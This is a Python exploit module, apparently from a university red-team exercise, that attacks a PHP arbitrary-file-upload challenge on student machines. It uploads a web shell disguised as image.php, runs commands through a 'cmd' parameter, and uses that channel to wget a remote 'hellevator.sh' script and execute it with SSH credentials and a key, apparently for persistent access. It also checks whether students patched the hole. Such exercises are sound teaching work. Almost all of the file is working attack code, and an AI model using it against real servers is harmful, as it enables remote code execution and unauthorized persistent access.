import requests
import urllib
from Exploit import Exploit, PatchedException
import BetterLogger
from BetterLogger import logger


class ChallengeTwoUpload(Exploit):
    def __init__(self, ip_address, parsed_config) -> None:
        super().__init__(ip_address=ip_address, parsed_config=parsed_config)

    def upload_file_to_server(self, file_name):
        url = f"http://{self.ip_address}/arbitrary_file_upload/upload.php"
        # logger.debug(f"{self.ip_address} - Uploading `{file_name}`...")
        file_to_upload = {"image": open(file_name, "rb")}
        server_response = requests.post(url, files=file_to_upload, timeout=3)
        server_response_text = server_response.text
        if "Success" in server_response_text:
            # logger.debug(f"{self.ip_address} - Successfully uploaded `{file_name}`.")
            return True
        # logger.debug(f"{self.ip_address} - Failed to upload `{file_name}`.")
        return False

    def upload_normal_image(self):
        return self.upload_file_to_server(file_name="./exploits/challenge2/1234.png")

    def upload_shell_php(self):
        return self.upload_file_to_server(file_name="./exploits/challenge2/image.php")

    def run_command(self, command):
        self.upload_shell_php()
        # logger.debug(f"{self.ip_address} - Running command `{command}`...")
        http_encoded_command_to_run = urllib.parse.quote(command.encode("utf8"))
        server_response = requests.get(
            f"http://{self.ip_address}/arbitrary_file_upload/images/image.php?cmd={http_encoded_command_to_run}",
            timeout=3,
        )
        server_status_code = server_response.status_code
        if server_status_code == 404:
            raise PatchedException(
                f"{self.ip_address} - Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`"
            )
        server_response_text = server_response.text
        command_output = (
            server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
        )
        # logger.debug(f"{self.ip_address} - Command returned `{command_output}`.")
        return command_output

    def run_hellevator(self):
        try:
            logger.info(
                f"{self.ip_address} - Running Hellevator via ChallengeTwoUpload..."
            )

            username = self.parsed_config["ssh_username"]
            password = self.parsed_config["ssh_password"]
            ssh_key = self.parsed_config["ssh_public_key"]

            download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
            server_response_text = self.run_command(command=download_hellevator_command)
            if ssh_key in server_response_text:
                logger.info(
                    f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}"
                )
                return True
            logger.info(
                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload!{BetterLogger.COLOR_END}"
            )
            return False
        except requests.ConnectionError:
            logger.info(
                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}"
            )
            return None
        except PatchedException:
            logger.info(
                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}"
            )
            return False
        except Exception as err:
            logger.info(
                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeTwoUpload.{BetterLogger.COLOR_END}"
            )
            logger.exception(err)
            return False

    def test_if_vulnerable(self):
        """
        Returns True if vulnerable and False if not
        """
        try:
            logger.info(
                f"{self.ip_address} - Testing if the target is vulnerable to ChallengeTwoUpload..."
            )
            uploaded_shell_php = self.upload_shell_php()
            if uploaded_shell_php:
                logger.info(
                    f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeTwoUpload!{BetterLogger.COLOR_END}"
                )
                return True
            else:
                uploaded_normal_image = self.upload_normal_image()
                if not uploaded_normal_image:
                    logger.info(
                        f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeTwoUpload so images cannot be uploaded!{BetterLogger.COLOR_END}"
                    )
                    return None
                logger.info(
                    f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}"
                )
                return False
        except requests.ConnectionError:
            logger.info(
                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeTwoUpload because the student disabled the apache2 service!{BetterLogger.COLOR_END}"
            )
            return None
        except Exception as err:
            logger.info(
                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeTwoUpload is vulnerable.{BetterLogger.COLOR_END}"
            )
            logger.exception(err)
            return False
